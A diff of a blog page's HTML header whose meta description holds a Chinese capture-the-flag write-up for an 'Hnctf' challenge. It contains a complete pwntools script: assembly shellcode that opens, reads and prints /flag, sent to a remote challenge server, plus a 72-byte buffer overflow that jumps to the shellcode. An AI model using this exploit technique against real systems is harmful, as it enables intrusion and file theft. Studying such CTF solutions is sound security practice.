@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="三步走战略 这个就是一个简单的orw使用open read write 三个函数就可以实现了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io = remote(&#39;27.25.151.198&#39;,47234) shellcode_addr = 0x1337000 sc = asm(&#39;&#39;&#39; /* open(&#39;/flag&#39;, 0) */ mov rax, 2 lea rdi, [rip + filename] xor rsi, rsi syscall /* read(fd, addr, 0x100) */ mov rdi, rax mov rsi, 0x1337200 mov edx, 0x100 xor eax, eax syscall /* write(1, addr, 0x100) */ mov eax, 1 mov edi, 1 mov rsi, 0x1337200 mov edx, 0x100 syscall /* exit(0) */ mov rax, 60 xor rdi, rdi syscall filename: .asciz &#34;/flag&#34; &#39;&#39;&#39;) io.sendafter(b&#39;prepare your acceptance speech in advance.&#39;, sc) payload = b&#39;a&#39;*72 + p64(shellcode_addr) io.sendlineafter(b&#39;Do you have anything else to say?&#39;, payload) io.interactive() shellcode 他和litctf的shellcode那题也很像也是一个测信道爆破的一个题目这里就不说了\n">
 <title>Hnctf</title>
